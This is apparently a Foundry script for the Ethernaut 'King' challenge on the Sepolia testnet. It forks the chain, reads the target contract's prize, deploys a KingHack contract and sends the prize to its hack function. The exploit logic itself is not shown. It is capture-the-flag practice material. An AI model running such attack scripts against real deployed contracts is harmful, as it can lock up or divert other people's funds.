// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {King, KingHack} from "../src/King.sol";


contract KingScript is Script {
    function setUp() public {}

    function run() public {
        hackContract();
    }

    function hackContract() internal {
        uint256 sepolia = vm.createFork(vm.rpcUrl("sepolia"));

        address KingAddress = 0xf399BcC272EEfF373485e4b8A2bf83D1A886234E;
        vm.selectFork(sepolia);

        vm.startBroadcast();

        console.log("Starting Hacking");

        uint256 prize = King(payable(KingAddress)).prize();

        KingHack hack = new KingHack();

        hack.hack{value: prize}(payable(KingAddress));

        vm.stopBroadcast();
    }
}
